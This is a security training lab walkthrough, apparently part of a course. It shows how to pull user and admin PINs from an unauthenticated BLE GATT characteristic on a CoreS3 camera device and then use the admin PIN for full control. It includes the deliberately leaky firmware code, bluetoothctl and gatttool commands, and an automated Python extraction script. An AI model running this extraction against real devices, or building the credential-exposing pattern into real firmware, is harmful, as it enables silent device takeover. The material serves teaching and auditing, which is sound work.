# L21: BLE GATT Credential Leak

## Goal
Extract device credentials (user PIN and admin PIN) from an unprotected BLE GATT characteristic that requires no pairing or authentication to read.

## Background

**Why this matters**: Many IoT devices expose configuration data via BLE GATT characteristics without access controls. When credentials are stored in a readable characteristic with no authentication, any device within BLE range can extract them silently.

**What you're looking for in IoT devices:**
- GATT characteristics exposing sensitive data (PINs, passwords, tokens) without access control
- "Just Works" pairing or no pairing required for reads
- Provisioning services that remain active after initial setup
- Debug or development service UUIDs (predictable patterns like `12345678-...`)

**On CoreS3**: The firmware initializes a BLE GATT config service (UUID `12345678-1234-5678-1234-56789abc0001`) with a characteristic (UUID `12345678-1234-5678-1234-56789abc0002`) set to `user_pin=XXXXXX;admin_pin=YYYYYY` containing actual device PINs from NVS. No pairing or authentication is required to read it.

```c
// Expose current config as characteristic value
CameraApp& app = CameraApp::getInstance();
String cfg = String("user_pin=") + app.getUserPIN() +
             ";admin_pin=" + app.getAdminPIN();
g_bleConfigChar->setValue(cfg.c_str());
```

## Hardware Setup

- CoreS3 device (BLE advertising as `CoreS3-CAM-XXXX`)
- Raspberry Pi Pico W running MicroPython, OR Linux with Bluetooth, OR phone with nRF Connect
- Optional: Ubertooth One or nRF52 DK for BLE traffic capture

```bash
# Linux BLE tools
sudo apt install -y bluez

# Python BLE library (alternative)
pip install bleak
```

## Lab Walkthrough

### Step 1: Scan for the BLE Device

Discover the CoreS3 and note its MAC address. The device name follows a predictable pattern (`CoreS3-CAM-XXXX`).

```bash
# Method 1: Using bluetoothctl
bluetoothctl
[bluetooth]# scan on

# Expected:
# [NEW] Device 24:0A:C4:XX:XX:XX CoreS3-CAM-XXXX

# Method 2: Using hcitool
sudo hcitool lescan

# Expected:
# 24:0A:C4:XX:XX:XX CoreS3-CAM-XXXX

# Method 3: nRF Connect app on Android/iOS
# Open nRF Connect -> Scan -> Look for "CoreS3-CAM-XXXX"
```

### Step 2: Connect and Enumerate GATT Services

Connect and list available services and characteristics.

```bash
# Using bluetoothctl
bluetoothctl
[bluetooth]# connect 24:0A:C4:XX:XX:XX

# After connection:
[CoreS3-CAM-XXXX]# menu gatt
[CoreS3-CAM-XXXX]# list-attributes

# Expected:
# Service 12345678-1234-5678-1234-56789abc0001
#   Characteristic 12345678-1234-5678-1234-56789abc0002
#     Properties: read, write, notify

# Alternative: Using gatttool
gatttool -b 24:0A:C4:XX:XX:XX -I
[24:0A:C4:XX:XX:XX][LE]> connect
[24:0A:C4:XX:XX:XX][LE]> primary

# Expected:
# attr handle: 0x0001, end grp handle: 0x0005 uuid: 12345678-1234-5678-1234-56789abc0001
```

The service UUID `12345678-1234-5678-1234-56789abc0001` uses a predictable pattern - a red flag during security audits.

### Step 3: Read the Configuration Characteristic

Read the characteristic to extract both PINs in plaintext. No authentication is required.

```bash
# Using gatttool
gatttool -b 24:0A:C4:XX:XX:XX --char-read \
  --uuid=12345678-1234-5678-1234-56789abc0002

# Expected (hex-encoded ASCII):
# handle: 0x0003   value: 75 73 65 72 5f 70 69 6e 3d ...

# Using bluetoothctl
bluetoothctl
[bluetooth]# connect 24:0A:C4:XX:XX:XX
[CoreS3-CAM-XXXX]# menu gatt
[CoreS3-CAM-XXXX]# select-attribute 12345678-1234-5678-1234-56789abc0002
[CoreS3-CAM-XXXX]# read

# Expected:
# Attribute has value:
# 75 73 65 72 5f 70 69 6e 3d ...

# Decode the hex to ASCII
python3 -c "
import binascii
hex_data = '757365725f70696e3d...'  # paste full hex here
print(binascii.unhexlify(hex_data.replace(' ','')).decode())
"

# Expected decoded output:
# user_pin=XXXXXX;admin_pin=YYYYYY
```

### Step 4: Use Extracted PINs for Device Access

The admin PIN grants full administrative control. Attack chain: BLE scan -> connect -> read -> extract PINs -> full device compromise.

```bash
# Use the admin PIN on the serial console
pio device monitor -b 115200

cores3-cam> login YYYYYY
Admin mode unlocked.

cores3-cam> whoami
admin

# Full admin access - dump NVS, firmware, etc.
cores3-cam> nvs-dump
```

### Step 5: Automate the Attack with Python

Script the full extraction with the `bleak` library, demonstrating the attack can run in seconds and scale to all devices in range.

```python
#!/usr/bin/env python3
"""ble_pin_extract.py - Extract PINs from CoreS3 BLE GATT characteristic."""
import asyncio
from bleak import BleakClient, BleakScanner

TARGET_SERVICE = "12345678-1234-5678-1234-56789abc0001"
CONFIG_CHAR = "12345678-1234-5678-1234-56789abc0002"

async def extract_pins():
    print("[*] Scanning for CoreS3 devices...")
    devices = await BleakScanner.discover(timeout=5)

    for d in devices:
        if d.name and "CoreS3-CAM" in d.name:
            print(f"[+] Found: {d.name} ({d.address})")

            async with BleakClient(d.address) as client:
                print(f"[*] Connected to {d.name}")
                data = await client.read_gatt_char(CONFIG_CHAR)
                decoded = data.decode('utf-8', errors='ignore')
                print(f"[+] Credential data: {decoded}")

                # Parse PINs
                for field in decoded.split(';'):
                    key, _, val = field.partition('=')
                    print(f"    {key} = {val}")

            return

    print("[-] No CoreS3 devices found")

asyncio.run(extract_pins())
```

```bash
python3 ble_pin_extract.py

# Expected:
# [*] Scanning for CoreS3 devices...
# [+] Found: CoreS3-CAM-XXXX (24:0A:C4:XX:XX:XX)
# [*] Connected to CoreS3-CAM-XXXX
# [+] Credential data: user_pin=XXXXXX;admin_pin=YYYYYY
#     user_pin = XXXXXX
#     admin_pin = YYYYYY
```

## Impact

- **PIN disclosure via GATT**: Both PINs readable by any BLE client without authentication
- **No physical access required**: Exploitable from BLE range (up to ~100m with directional antenna)
- **Silent exploitation**: Reading a GATT characteristic generates no alerts or notifications
- **Full device compromise**: Admin PIN grants access to all admin serial commands and touchscreen
- **Fleet-wide risk**: All devices running this firmware expose the same vulnerable service

## References

- [Bluetooth Core Specification v5.4 - GATT](https://www.bluetooth.com/specifications/specs/core-specification-5-4/)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-311: Missing Encryption of Sensitive Data](https://cwe.mitre.org/data/definitions/311.html)
- [NIST SP 800-121 Rev 2 - Guide to Bluetooth Security](https://csrc.nist.gov/publications/detail/sp/800-121/rev-2/final)
- [Bleak - Python BLE library](https://bleak.readthedocs.io/)
- [nRF Connect for Mobile](https://www.nordicsemi.com/Products/Development-tools/nRF-Connect-for-mobile)
